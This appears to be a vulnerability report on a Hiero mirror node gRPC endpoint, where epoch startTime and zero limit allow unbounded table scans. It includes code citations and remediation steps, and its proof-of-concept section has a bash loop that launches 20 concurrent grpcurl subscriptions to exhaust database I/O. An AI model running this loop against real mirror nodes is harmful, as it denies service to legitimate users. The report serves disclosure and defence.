### Title
Unbounded Historical Query via Epoch `startTime` Causes Full Table Scan DoS in `subscribeTopic()`

### Summary
An unprivileged user can open a gRPC subscription with `startTime=0` (Unix epoch, January 1 1970) and no limit, causing `topicMessageRetriever.retrieve(filter, true)` to perform a full sequential scan of the entire `topic_message` table. Because there is no minimum `startTime` bound, no query-range cap, and no per-client subscription throttle, an attacker can open many such subscriptions concurrently, exhausting all available database I/O bandwidth and causing a non-network DoS for all other users.

### Finding Description

**Exact code path:**

`TopicMessageServiceImpl.subscribeTopic()` (line 63) passes the user-supplied filter directly to the retriever:

```java
Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
``` [1](#0-0) 

**Root cause — failed validation in `TopicMessageFilter`:**

The `startTime` field carries only two constraints:

```java
@Min(0)
@NotNull
@Builder.Default
private long startTime = DomainUtils.now();
``` [2](#0-1) 

The custom validator only checks that `startTime` is not in the future:

```java
@AssertTrue(message = "Start time must be before the current time")
public boolean isValidStartTime() {
    return startTime <= DomainUtils.now();
}
``` [3](#0-2) 

`@Min(0)` explicitly permits epoch `0` (nanoseconds since 1970-01-01T00:00:00Z), and `isValidStartTime()` accepts any past timestamp without bounding how far back it reaches. There is no maximum allowed time-range (e.g., `now - startTime <= X`) enforced anywhere.

**No limit required:**

```java
@Min(0)
private long limit;
``` [4](#0-3) 

`limit=0` means "no limit" (`hasLimit()` returns false), so the retriever streams every matching row.

**No subscriber cap or rate limit in `GrpcProperties`:**

`GrpcProperties` exposes no per-client connection limit, no maximum concurrent subscriber count, and no historical-query rate limit. The `subscriberCount` metric in `TopicMessageServiceImpl` is only a gauge — it is never checked to reject new subscriptions. [5](#0-4) [6](#0-5) 

### Impact Explanation

Each subscription with `startTime=0` and `limit=0` forces the database to scan the `topic_message` table from the very first recorded message. On a production mirror node that has been running since mainnet genesis (2019), this table contains hundreds of millions of rows. A single such query saturates disk I/O; a handful of concurrent subscriptions (easily opened by one attacker from a single IP) can fully exhaust database I/O bandwidth, causing query timeouts and failures for all legitimate users of the REST API, other gRPC subscribers, and the importer. This is a high-severity non-network DoS.

### Likelihood Explanation

The gRPC `subscribeTopic` endpoint is publicly accessible with no authentication. The attacker needs only a standard gRPC client (e.g., `grpcurl`) and knowledge of any valid topic ID (all topic IDs are public on-chain). The exploit is trivially repeatable: open N connections in a loop with `startTime=0, limit=0`. No special privileges, tokens, or network capabilities are required.

### Recommendation

1. **Enforce a minimum `startTime` floor**: Reject or clamp `startTime` values older than a configurable maximum lookback window (e.g., 30 days), validated in `TopicMessageFilter.isValidStartTime()`.
2. **Enforce a maximum query time-range**: Add a validator that rejects `(endTime ?? now) - startTime > maxRangeNanos`.
3. **Enforce a mandatory minimum `limit`** or a configurable maximum page size in `RetrieverProperties` so unbounded scans are impossible.
4. **Add per-client/IP concurrent subscription limits** and reject new subscriptions when `subscriberCount` exceeds a configurable threshold.
5. **Add query cost throttling** in `PollingTopicMessageRetriever` (e.g., max rows per poll, inter-poll delay) that cannot be bypassed by the caller.

### Proof of Concept

```bash
# Install grpcurl, point at a mirror node gRPC endpoint
# Any valid topicId (e.g., 0.0.1234) suffices

for i in $(seq 1 20); do
  grpcurl -plaintext \
    -d '{
      "topicID": {"shardNum": 0, "realmNum": 0, "topicNum": 1234},
      "consensusStartTime": {"seconds": 0, "nanos": 0},
      "limit": 0
    }' \
    <mirror-node-host>:5600 \
    com.hedera.mirror.api.proto.ConsensusService/subscribeTopic &
done
wait
```

Each of the 20 concurrent connections triggers `topicMessageRetriever.retrieve(filter, true)` with `startTime=0` and no limit, issuing a full sequential scan of `topic_message` from epoch. Database CPU and I/O spike to 100%; legitimate queries begin timing out within seconds.

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-56)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L63-63)
```java
        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L25-31)
```java
    @Min(0)
    private long limit;

    @Min(0)
    @NotNull
    @Builder.Default
    private long startTime = DomainUtils.now();
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L48-51)
```java
    @AssertTrue(message = "Start time must be before the current time")
    public boolean isValidStartTime() {
        return startTime <= DomainUtils.now();
    }
```
